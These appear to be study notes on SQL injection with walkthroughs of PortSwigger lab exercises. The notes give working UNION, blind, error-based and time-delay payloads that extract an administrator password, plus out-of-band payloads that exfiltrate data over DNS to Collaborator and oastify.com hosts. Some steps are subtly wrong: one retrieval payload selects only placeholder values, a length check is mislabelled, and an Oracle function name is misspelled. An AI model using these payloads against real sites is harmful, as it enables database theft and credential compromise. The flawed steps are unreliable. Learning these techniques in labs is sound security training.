# SQL Injection

1. [Introduction](#introduction)
1. [SQL injection examples](#sql-injection-examples)
1. [SQLi UNION attacks](#sqli-union-attacks)
1. [Blind SQLi](#blind-sqli)
1. [Examining the database in SQLi](#examining-the-database-in-sqli)
1. [Labs](#labs)

## Introduction

* SQLi (SQL injection): web security vuln that allows an attacker to modify SQL queries made by an app to its DB

* SQLi can be detected via tests using payloads like single-quote character ```'```, SQL syntax, boolean conditions, time delay payloads, out-of-band payloads, etc.

* [SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL injection examples

* Retrieving hidden data:

  * in a webapp, suppose the URL requested for a 'Gifts' category is "https://insecure-website.com/products?category=Gifts"

  * this causes the webapp to make a SQL query like ```SELECT * FROM products WHERE category = 'Gifts' AND released = 1```, where the 'released' parameter hides/unhides products

  * if an attacker constructs a malicious request to "https://insecure-website.com/products?category=Gifts'--", this results in the SQL query ```SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1```, where ```--``` is a comment indicator in SQL (so part of the query, following the comment, is removed)

  * a similar malicious request to "https://insecure-website.com/products?category=Gifts'+OR+1=1--" causes the SQL query ```SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1```

  * [lab example](#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)

* Subverting app logic:

  * suppose the webapp uses the following SQL query for login: such that if it is successful, user details are returned:

    ```sql
    SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
    ```
  
  * an attacker can use the ```--``` comment sequence to remove the password check from the ```WHERE``` clause by submitting an username like ```administrator--``` and any password such that the query is:

    ```sql
    SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
    ```
  
  * [lab example](#sql-injection-vulnerability-allowing-login-bypass)

* Retrieving data from other database tables:

  * suppose the webapp uses the following query with user input 'Gifts':

    ```sql
    SELECT name, description FROM products WHERE category = 'Gifts'
    ```
  
  * an attacker can use ```UNION``` keyword to append ```SELECT``` queries, and fetch data from other tables in same DB, using the following input:

    ```sql
    ' UNION SELECT username, password FROM users--
    ```

* Blind SQLi vulnerabilities:

  * in blind SQLi, the app does not return the SQL query results or any DB errors

  * to exploit blind SQLi vulns, techniques like boolean logic, time delay, or out-of-band network interaction can be used

* Second-order SQLi:

  * first-order SQLi: the app processes user input from a HTTP request, and uses the input into an unsafe SQL query

  * second-order SQLi (stored SQLi): the app takes user input from a HTTP request and stores it for future use (in a DB); when handling a different request, the app fetches the stored data and uses it into an unsafe SQL query

* Examining the database:

  * due to differences (syntax, comments, queries, APIs, errors, etc.) in databases, once a SQLi vuln is identified, info about the DB should be collected

* SQLi in different contexts:

  * different payload formats like JSON or XML can be used to query the DB in SQLi attacks; this can also be used to bypass WAFs or filters

  * e.g.: XML-based SQLi using XML escape sequence to encode the char 'S':

    ```xml
    <stockCheck>
        <productId>123</productId>
        <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
    </stockCheck>
    ```
  
  * [lab example](#sql-injection-with-filter-bypass-via-xml-encoding)

## SQLi UNION attacks

* ```UNION``` attacks:

  * ```UNION``` query can be used to execute ```SELECT``` queries and append the results to the original query:

    ```sql
    SELECT a, b FROM table1 UNION SELECT c, d FROM table2
    ```
  
  * requirements for a ```UNION``` query to work:

    * individual queries must return same number of columns

    * data types in each column must be compatible between the queries
  
* Determining the number of columns required:

  * method 1: ```ORDER BY``` -

    * inject a series of ```ORDER BY``` clauses and increment the column index, until an error occurs; e.g.: ```' ORDER BY 1--```, ```' ORDER BY 2--```, ```' ORDER BY 3--```, etc.
    
    * when the column index (in the SQLi query) exceeds the number of actual columns in the result set, the DB returns an error (or the response may give a generic error, or no results will be shown)
  
  * method 2: ```UNION SELECT``` -

    * submit a series of ```UNION SELECT``` payloads with increasing number of NULL values; e.g.: ```' UNION SELECT NULL--```, ```' UNION SELECT NULL,NULL--```, ```' UNION SELECT NULL,NULL,NULL--```, etc.

    * if the number of NULLs does not match the number of columns, the DB returns an error (if the number of columns match, the DB may return an additional row)
  
  * [lab example](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)

* Database-specific syntax:

  * in Oracle, every ```SELECT``` query must use the ```FROM``` keyword and specify a valid table; the built-in ```dual``` table can be used for this:

    ```sql
    ' UNION SELECT NULL FROM DUAL--
    ```
  
  * in MySQL, the ```--``` comment sequence must be followed by a space (unlike Oracle, which does not need a space); alternatively ```#``` can be used

* Finding columns with a useful data type:

  * after finding number of columns required, we can probe each column to test if it can hold string data: as the interesting data is usually in string form

  * for example, if the query returns 3 columns, we can test with these payloads:

    * ```' UNION SELECT 'a',NULL,NULL--```
    * ```' UNION SELECT NULL,'a',NULL--```
    * ```' UNION SELECT NULL,NULL,'a'--```
  
  * if the column data type is not compatible with string data, the DB can return an error; if an error does not occur, and the app response includes additional data, then that column could be used for fetching string data

  * [lab example](#sql-injection-union-attack-finding-a-column-containing-text)

* Retrieving interesting data:

  * suppose the original query returns 2 columns: both compatible with string data: with the injection point being a quoted string within the ```WHERE``` clause; and the DB contains a table 'users' with 'username' & 'password' columns

  * in such a case, we can fetch 'users' data with this SQLi query:

    ```sql
    ' UNION SELECT username, password FROM users--
    ```
  
  * [lab example](#sql-injection-union-attack-retrieving-data-from-other-tables)

* Retrieving multiple values within a single column:

  * multiple values can be fetched in a single column by concatenating the values together, with a separator to distinguish the values; e.g.: in Oracle, ```||``` can be used for string concatenation:

    ```sql
    ' UNION SELECT username || '~' || password FROM users--
    ```
  
  * [lab example](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)

## Blind SQLi

* Triggering conditional responses:

  * suppose a webapp uses tracking cookies using a cookie header like ```Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4```; when a request contains this cookie, the app uses the following SQL query to determine if it is a known user:

    ```sql
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
    ```
  
  * the query is vulnerable to SQLi, but the results are not returned to the user; however, if the 'TrackingId' is recognized, the query returns data and we get a message 'Welcome back'

  * we can trigger different responses conditionally:

    * ```...xyz' AND '1'='1``` - the injected condition is true, so the 'Welcome back' message is shown
    * ```...xyz' AND '1'='2``` - the injected condition is false, so the message is not shown

  * we can use this to extract data, one piece at a time:

    * suppose there is a 'Users' table with 'Username' & 'Password' columns, and we need to find password of user 'Administrator'

    * we can find user password, one character at a time, by sending a series of inputs:

      * ```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm``` - this returns 'Welcome back', meaning the injected condition is true, and first character of password is greater than 'm' (substring is index-based, starting from offset 1, and selects 1 character)
      * ```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't``` - next, this does not return 'Welcome back' message, meaning the first character of password is not greater than 't'
      * ```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's``` - this returns 'Welcome back', meaning the first character of password is 's'
  
  * [lab example](#blind-sql-injection-with-conditional-responses)

* Error-based SQLi:

  * triggering conditional errors:

    * certain webapps will have no change in behavior regardless of SQL queries returning data, but they can respond to DB errors

    * we can modify the SQL query such that it causes a DB error only if the condition is true; for example, suppose the 'TrackingId' cookie value is vulnerable to SQLi -

      * ```xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a``` - the condition is false, so the query evaluates to 'a', which is true

      * ```xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a``` - the condition is true, so the query evaluates to 1/0, which causes a divide-by-zero error
    
    * if the error causes a difference in the response, this can be used to determine if the injected condition is true: we can use this to retrieve data, testing one char at a time -

      ```sql
      xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
      ```
    
    * [lab example](#blind-sql-injection-with-conditional-errors)

  * extracting sensitive data via verbose errors:

    * DB misconfigurations can cause verbose error messages; e.g.: injecting a single quote in a parameter can show the SQL query in the error, which can be used to create the payload

    * we can also induce the app to generate an error message containing some data returned by the query; e.g.: using ```CAST()``` function, which can be used to convert one data type to another:

      ```sql
      CAST((SELECT username FROM users) AS int)
      # this may print the data in error
      ```
    
    * [lab example](#visible-error-based-sql-injection)

* Triggering time delays:

  * blind SQLi vulns can be exploited by triggering time delays (which delays the HTTP response), depending on whether the injected condition is true or false

  * methods for triggering time delays are database-specific; e.g.: on Microsoft SQL Server, conditions can be tested to trigger delays:

    ```sql
    '; IF (1=2) WAITFOR DELAY '0:0:10'--
    # false, does not trigger delay
    ```

    ```sql
    '; IF (1=1) WAITFOR DELAY '0:0:10'--
    # true, triggers delay of 10 seconds
    ```
  
  * this can be used to fetch data one char at a time:

    ```sql
    '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
    ```
  
  * [lab example 1](#blind-sql-injection-with-time-delays)

  * [lab example 2](#blind-sql-injection-with-time-delays-and-information-retrieval)

* Out-of-band (OAST) techniques:

  * if the app executes SQL queries asynchronously, time-based SQLi would not work

  * in such situations, triggering out-of-band network interactions to attacker system can help in exploiting SQLi and exfiltrating data; DNS is commonly used for this

  * Burp Collaborator tool can be used for out-of-band techniques

  * for example, the following input on Microsoft SQL server can be used to cause a DNS lookup on the specified domain:

    ```sql
    '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
    ```
  
  * out-of-band network interactions can be used for data exfiltration too; for example, the payload to read the 'Administrator' password, appended to the Collaborator subdomain, is:

    ```sql
    '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
    ```
  
  * [lab example 1](#blind-sql-injection-with-out-of-band-interaction)

  * [lab example 2](#blind-sql-injection-with-out-of-band-data-exfiltration)

## Examining the database in SQLi

* Querying the DB type & version:

  * to check DB version, we can use queries like ```SELECT version()```, ```SELECT @@version``` and ```SELECT * FROM v$version```

  * if used in a SQLi payload like ```' UNION SELECT @@version--```, we can check for any output

  * [lab example 1](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)

  * [lab example 2](#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)

* Listing the contents:

  * ```information_schema.tables``` can be queried to list tables in DB (except Oracle); similarly, ```information_schema.columns``` for listing columns in tables

  * in an Oracle DB, query ```all_tables``` for listing tables, and query ```all_tab_columns``` for listing columns

  * [lab example 1](#sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)

  * [lab example 2](#sql-injection-attack-listing-the-database-contents-on-oracle)

## Labs

1. ### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

* it is given that selecting the 'Gifts' category causes the webapp to do this SQL query:

  ```sql
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  ```

* this leads to the page "/filter?category=Gifts", and the goal is to view all possible products

* to view all gifts, we can perform SQLi by navigating to the page "/filter?category=Gifts'+OR+1=1--": this results in the query:

  ```sql
  SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
  ```

2. ### SQL injection vulnerability allowing login bypass

* given the login form, we need to login as 'administrator' user via SQLi

* we can navigate to the '/login' endpoint, and try using the comment ```--``` in our username like ```administrator--``` but this does not work

* we can try to use the username as ```administrator' OR 1=1--``` such that the rest of the SQL query is commented out: and this works:

  ```sql
  SELECT * FROM users WHERE username = 'administrator' OR 1=1--' AND password = 'test'
  ```

3. ### SQL injection UNION attack, determining the number of columns returned by the query

* given the SQLi in the product category filter, we need to find the number of columns returned by the query via ```UNION``` attacks

* after selecting any of the categories, we can intercept a request in Burp Suite, and send to Repeater

* the normal request to "/filter?category=Lifestyle" can be modified in Repeater with the following SQLi attempts:

  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL--``` - 500 Internal Server Error

  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--``` - 500 Internal Server Error

  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--``` - 200 OK

* this returns an additional row in the result set, which confirms the number of columns as 3

4. ### SQL injection UNION attack, finding a column containing text

* given the SQLi in the product category filter, we need to find the number of columns & identify a column compatible with string data (using the random value provided)

* after selecting one of the categories, we can intercept a request in Burp Suite and send to Repeater

* similar to the previous method, we can determine the number of columns using this query which does not return an error: ```/filter?category=Lifestyle'+UNION+SELECT+NULL,NULL,NULL--```

* to determine which column is compatible with string data, we can test the following payloads:

  * ```/filter?category=Lifestyle'+UNION+SELECT+'piDHES',NULL,NULL--``` - 500 Internal Server Error

  * ```/filter?category=Lifestyle'+UNION+SELECT+NULL,'piDHES',NULL--``` - 200 OK

* this confirms the 2nd column is compatible with string data type

5. ### SQL injection UNION attack, retrieving data from other tables

* given the SQLi in the product category filter, we need to fetch all usernames & passwords, and login as 'administrator' user (it is also given that the DB contains a different table 'users' with 'username' & 'password' columns)

* we can select one of the categories, and intercept the request in Burp Suite, and send to Repeater

* we can determine the number of columns using the ```UNION SELECT``` method

* in this case, 2 is the required number of columns as per the payload: ```/filter?category=Gifts'+UNION+SELECT+NULL,NULL--```

* we can confirm that both columns are compatible with string data type in this case:

  * ```/filter?category=Gifts'+UNION+SELECT+'a',NULL--``` - 200 OK

  * ```/filter?category=Gifts'+UNION+SELECT+'a','a'--``` - 200 OK

* we can use this information to fetch the username and password data from 'users' table using this payload: ```/filter?category=Gifts'+UNION+SELECT+'a','a'--```

* this dumps the data in the response; we can use the 'administrator' user's password to login using the 'My Account' option

6. ### SQL injection UNION attack, retrieving multiple values in a single column

* given the SQLi in the product category filter, we need to fetch all usernames & passwords, and login as 'administrator' user (it is also given that the DB contains a different table 'users' with 'username' & 'password' columns)

* we can select one of the categories, and intercept the request in Burp Suite, and send to Repeater

* determine the number of columns using ```UNION SELECT``` payloads; in this case, the payload ```/filter?category=Pets'+UNION+SELECT+NULL,NULL--``` shows 2 columns is needed in result set

* checking for compatibility with string data type:

  * ```/filter?category=Pets'+UNION+SELECT+'a',NULL--``` - 500 Internal Server Error

  * ```/filter?category=Pets'+UNION+SELECT+NULL,'a'--``` - 200 OK

* only one column is compatible with string data, so we need to use the concatenation operator to fetch 'username' and 'password' column values from 'users' table

* we can test with the payload: ```/filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--``` - this executes the following SQLi query:

  ```sql
  ' UNION SELECT NULL,username || '~' || password FROM users--
  ```

* this fetches the data from 'users' table, and includes the 'administrator' password: we can use this to login

7. ### Blind SQL injection with conditional responses

* given that the app uses a tracking cookie and performs a SQL query using the cookie value, and that it includes a 'Welcome back' message if the query returns any rows, we need to find the password of 'administrator' user from the 'users' table (with 'username' & 'password' columns)

* intercept a request to the app page in Burp Suite, and send to Repeater; we can see the cookie for 'TrackingId': this is our injection point

* we can first confirm the given conditions work with the given string:

  * ```yYD927v2Fn5FPsgK' AND '1'='1``` - the string 'Welcome back' is found in response; condition is true
  * ```yYD927v2Fn5FPsgK' AND '1'='2``` - the string is not found in response; condition is false

* next, confirm the required data exists:

  * ```yYD927v2Fn5FPsgK' AND (SELECT 'a' FROM users WHERE username = 'administrator') = 'a``` - string found in response; condition is true: this confirms username 'administrator' exists in 'users' table

* now, we can determine the password length:

  * ```yYD927v2Fn5FPsgK' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'a``` - string found in response; condition is true
  * ```yYD927v2Fn5FPsgK' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 10) = 'a``` - string found in response; condition is true
  * ```yYD927v2Fn5FPsgK' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 20) = 'a``` - string not found in response; condition is false
  * ```yYD927v2Fn5FPsgK' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) = 20) = 'a``` - string found in response; condition is true

* now that we have determined the password length is 20 characters, we can determine the password string

* we need to use the following SQLi payload to determine each character of the payload: it is given that the password can have lowercase chars and digits:

  ```sql
  yYD927v2Fn5FPsgK' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm
  # this checks if the first character of the password is 'm'
  ```

* to speed up the process, we can use Burp Suite Intruder:

  * send the intercepted request to Intruder and use the above payload

  * in the Intruder tab, we can consider two positions to be brute-forced:

    * the character offset: to check for 1st char, 2nd char, 3rd char, etc.
    * the character to be compared: to check which char it is equal to
  
  * add the payload positions: ```yYD927v2Fn5FPsgK' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§m§```

  * select attack type as 'Cluster Bomb' attack: this goes through all possible combinations (alternative it to go for 'Sniper' attack, and brute-force each character position at a time)

  * add the payloads:

    * for payload position 1: select 'payload type' as numbers, and 'number range' as 1-20
    * for payload position 2: select 'add from list', and add 'a-z' & '0-9'
  
  * start the attack, and once the attack is complete we can filter the responses for 'welcome back' string

  * the responses with this string are having a lower length, so we can sort all results by length (or match by grep)

  * this gives us the valid character at each position (as they are having a smaller response size than others): we can concatenate the results to get the password 'u3t8k7n1fdwtxedesd7r' and login as 'administrator'

8. ### Blind SQL injection with conditional errors

* given that the app uses a tracking cookie and performs a SQL query using the cookie value, we need to find the password of 'administrator' user from the 'users' table (with 'username' & 'password' columns): the app will respond with a custom error message if the SQL query causes an error

* intercept a request to the app page in Burp Suite, and send to Repeater; we can see the cookie for 'TrackingId': this is our injection point

* first, confirm the custom error exists with respect to the SQL query for 'TrackingId' cookie (URL-encoding not required):

  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a``` - 500 Internal Server Error, but the condition here is false

  * as the false boolean condition does not generate a 200 OK response, we can attempt different DB syntax

  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a``` - 200 OK; the condition is false

  * this works as expected, so we can confirm it is running Oracle DB

  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a``` - 500 Internal Server Error; the condition here is true

* the app is running Oracle DB: we can use that specific syntax to confirm the required data exists:

  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a``` - 200 OK; the condition is false: this confirms that username 'administrator' exists in 'users' table
  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a``` - 500 Internal Server Error; the condition is true

* next, we can determine length of password for 'administrator':

  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (LENGTH(password) < 1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a``` - 200 OK; the condition is false: since the password is not less than 1 character
  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (LENGTH(password) > 10) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a``` - 500 Internal Server Error; the condition is true: the password is more than 10 characters
  * ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (LENGTH(password) = 20) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a``` - 500 Internal Server Error; the condition is true

* the 500 Internal Server Error shows that the password is 20 characters long

* now, we need to use the following SQLi payload to determine each character of the payload: assuming that the password can have uppercase, lowercase chars and digits; using Oracle SQL syntax:

  ```sql
  dBb8wVCByugW29qy' AND (SELECT CASE WHEN (SUBSTR(password,1,1) = 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a
  # this checks if 1st char of password is 'm'
  ```

* we can use Burp Suite Intruder for bruteforcing:

  * send the captured request from Repeater to Intruder; use the above payload for SQLi

  * in the Intruder tab, consider the following positions for payload:

    * character offset: to move the character index after attempting all chars
    * character to be compared: to find the actual character
  
  * add the payload positions: ```dBb8wVCByugW29qy' AND (SELECT CASE WHEN (SUBSTR(password,§1§,1) = '§m§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a```

  * select attack type: Cluster bomb: to go through all possible combinations (alternative: Sniper attack to run the bruteforce for each position manually)

  * add the payloads:

    * for payload position 1: select 'payload type' as numbers, and 'number range' as 1-20
    * for payload position 2: select 'add from list', and add 'A-Z', 'a-z' & '0-9'
  
  * start the attack, and once the attack is complete we can filter the responses by status code 500 (or length)

  * next, we can sort by character offset payload (payload 1): this gives us the valid character at each position in the password string

  * we can concatenate the results to get the password 'cy1m9zdv4yd67xxe9iru' and login as 'administrator'

9. ### Visible error-based SQL injection

* given that the app uses a tracking cookie and performs a SQL query using the cookie value, we need to find the password of 'administrator' user from the 'users' table (with 'username' & 'password' columns)

* capture a request to the webpage in Burp Suite, and send to Repeater

* if we inject a single quote in the tracking cookie value: ```Wxsq6qi4Bfw0SzBV'``` - we get an error -

  ```sql
  Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'Wxsq6qi4Bfw0SzBV''. Expected  char
  ```

* the verbose error message leaks the SQL query used in the backend:

  ```sql
  SELECT * FROM tracking WHERE id = 'Wxsq6qi4Bfw0SzBV'
  ```

* we can use this information to create the payload to fetch the 'administrator' user's password

* we can use this payload to get the username first: ```Wxsq6qi4Bfw0SzBV' AND CAST((SELECT username FROM users) AS int)--``` - we get this error message:

  ```sql
  Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'Wxsq6qi4Bfw0SzBV' AND CAST((SELECT username FROM users) AS i'. Expected  char
  ```

* the query is truncated due to a possible character limit implementation

* we can workaround this by removing the tracking cookie id (or part of it): ```' AND CAST((SELECT username FROM users) AS int)--``` - this gives us another error:

  ```sql
  ERROR: argument of AND must be type boolean, not type integer
  Position: 42
  ```

* as the query wants a boolean type, we can add a comparison operator like ```=```

* updated payload: ```' AND 1=CAST((SELECT username FROM users) AS int)--``` - this gives us a different error:

  ```sql
  ERROR: more than one row returned by a subquery used as an expression
  ```

* as the subquery is returning multiple rows, we can limit this to a single row using the ```LIMIT``` keyword: ```' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--``` - this leaks the username in the error:

  ```sql
  ERROR: invalid input syntax for type integer: "administrator"
  ```

* we can use the following payload to get the password in the same way: ```' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--``` - and login as 'administrator'

10. ### Blind SQL injection with time delays

* given that the app uses a tracking cookie and performs a SQL query using the cookie value, we need to cause a 10 second delay by triggering conditional time delays

* capture a request to the webpage in Burp Suite, and send to Repeater; the tracking cookie would be our injection point

* as we do not know which DB is used in the webapp, we can test the payloads applicable for different DBs

* the SQL query in the backend could be something like ```SELECT tracking_id FROM tracking_table WHERE tracking_id='x';``` - so we need to use the payload without the ```SELECT``` part

* to concatenate the queries, we cannot use ```;``` as that would mark the end of the tracking cookie value: we can use ```||``` instead:

  * ```RLnbObbCm8nhab5T' || dbms_pipe.receive_message(('a'),10)--``` - Oracle DB payload does not work
  * ```RLnbObbCm8nhab5T' || WAITFOR DELAY '0:0:10'--``` - Microsoft SQL Server payload does not work
  * ```RLnbObbCm8nhab5T' || SLEEP(10)-- ``` - MySQL payload does not work
  * ```RLnbObbCm8nhab5T' || pg_sleep(10)--``` - PostgreSQL payload works and the response is delayed by 10 seconds

11. ### Blind SQL injection with time delays and information retrieval

* given that the app uses a tracking cookie and performs a SQL query using the cookie value, we need to get the password of the 'administrator' user (from the 'users' table with columns 'username' & 'password'), using conditional time delays

* capture a request to the webpage in Burp Suite, and send to Repeater; the tracking cookie would be our injection point

* first, we need to identify the backend DB using time-delay payloads for different DBs: we can use URL-encoded ```;``` to inject our query:

  * ```ZDL38sJPTbMOaXbH'%3b dbms_pipe.receive.message(('a'),10)--``` - Oracle DB payload does not work
  * ```ZDL38sJPTbMOaXbH'%3b WAITFOR DELAY '0:0:10'--``` - Microsoft SQL Server payload does not work
  * ```ZDL38sJPTbMOaXbH'%3b SELECT SLEEP(10)-- ``` - MySQL payload does not work
  * ```ZDL38sJPTbMOaXbH'%3b SELECT pg_sleep(10)--``` - PostgreSQL payload works, as the response is delayed by 10 seconds

* as the DB is confirmed to be PostgreSQL, next we can confirm if the given data exists:

  * ```ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--``` - this delays the response by 10 seconds, proving that conditional time delay can be used

  * ```ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--``` - this is delayed by 10 seconds, proving 'administrator' exists

* we can now determine the password length

  * ```ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--``` - delayed by 10 seconds, as the password is greater than 1 char
  * ```ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--``` - delayed by 10 seconds, as the password is greater than 10 chars
  * ```ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--``` - delayed by 10 seconds, which confirms the password length

* next, we can determine the password: we can use the following payload:

  ```sql
  ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
  # this checks if 1st char of password is 'm'
  ```

* we can use Burp Suite Intruder for bruteforcing:

  * send the captured request from Repeater to Intruder; use the above payload for SQLi

  * in the Intruder tab, consider the following positions for payload:

    * character offset: to move the character index after attempting all chars
    * character to be compared: to find the actual character
  
  * add the payload positions: ```ZDL38sJPTbMOaXbH'%3b SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§m§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--```

  * select attack type: Cluster bomb: to go through all possible combinations (alternative: Sniper attack to run the bruteforce for each position manually)

  * add the payloads:

    * for payload position 1: select 'payload type' as numbers, and 'number range' as 1-20
    * for payload position 2: select 'add from list', and add 'A-Z', 'a-z' & '0-9'
  
  * start the attack, and once the attack is complete we can sort by 'response received' column in descending

  * the top 20 results will show that characters at each index: concatenate this to get the password, and login as 'administrator'

12. ### Blind SQL injection with out-of-band interaction

* given that the app uses a tracking cookie and performs a SQL query using the cookie value in an async manner, we need to trigger an out-of-band interaction to cause a DNS lookup to Burp Collaborator

* capture a request to the webpage in Burp Suite, and send to Repeater; the tracking cookie would be our injection point

* navigate to Burp Suite Collaborator, and copy the payload: this gives us a randomly-generated domain

* we need to identify the backend DB using out-of-band DNS payloads for different DBs: we need to use the URL-encoded forms of the payloads:

  * ```XphpJLHSBiyRKoCf'%3b+exec+master..xp_dirtree+'//<collaborator-domain-payload>/a'--``` - Microsoft SQL Server payload does not work
  * ```XphpJLHSBiyRKoCf'%3b+copy+(SELECT+'')+to+program+'nslookup+<collaborator-domain-payload>'--``` - PostgreSQL payload does not work
  * ```XphpJLHSBiyRKoCf'%3b+LOAD_FILE('\\\\<collaborator-domain-payload>\\a')--+``` - MySQL payload does not work
  * ```XphpJLHSBiyRKoCf'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//<collaborator-domain-payload>/">+%25remote%3b]>'),'/l')+FROM+dual--``` - Oracle payload works and we get response on Collaborator

13. ### Blind SQL injection with out-of-band data exfiltration

* given that the app uses a tracking cookie and performs a SQL query using the cookie value in an async manner, we need to get the password of the 'administrator' user (from the 'users' table with columns 'username' & 'password'), using out-of-band techniques

* capture a request to the webpage in Burp Suite, and send to Repeater; the tracking cookie would be our injection point

* navigate to Burp Suite Collaborator, and copy the payload: this gives us a randomly-generated domain: '9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com'

* first, we need to identify the backend DB using out-of-band DNS payloads: test with both normal and URL-encoded forms of the payloads:

  * Microsoft SQL Server payloads:

    * ```Z0nGssfkht0dznld' exec master..xp_dirtree '//9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/a'--```
    * ```Z0nGssfkht0dznld'; exec master..xp_dirtree '//9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/a'--``` (including semicolon)
    * ```Z0nGssfkht0dznld'%3b+exec+master..xp_dirtree+'//9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com/a'--``` (URL-encoded)
  
  * PostgreSQL payloads:

    * ```Z0nGssfkht0dznld' copy (SELECT '') to program 'nslookup 9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com'--```
    * ```Z0nGssfkht0dznld'; copy (SELECT '') to program 'nslookup 9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com'--``` (including semicolon)
    * ```Z0nGssfkht0dznld'%3b+copy+(SELECT+'')+to+program+'nslookup+9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com'--``` (URL-encoded)
  
  * MySQL payloads:

    * ```Z0nGssfkht0dznld' LOAD_FILE('\\\\9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com\\a')-- ```
    * ```Z0nGssfkht0dznld'; LOAD_FILE('\\\\9gq2a5qq2rouzqoayh7znsqbx23trjf8.oastify.com\\a')-- ``` (including semicolon)
